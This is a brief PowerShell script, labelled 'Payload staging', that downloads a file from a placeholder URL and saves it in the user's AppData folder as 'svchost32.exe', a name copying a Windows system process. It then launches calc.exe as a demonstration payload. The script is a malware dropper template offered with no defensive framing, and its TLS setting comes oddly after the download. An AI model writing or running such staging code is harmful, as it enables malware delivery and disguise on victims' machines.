<# Payload staging #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://example.com/stage1.ps1",
    [string]$DropPath = "$env:APPDATA\svchost32.exe",
    [int]$TransferTimeout = 174
)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
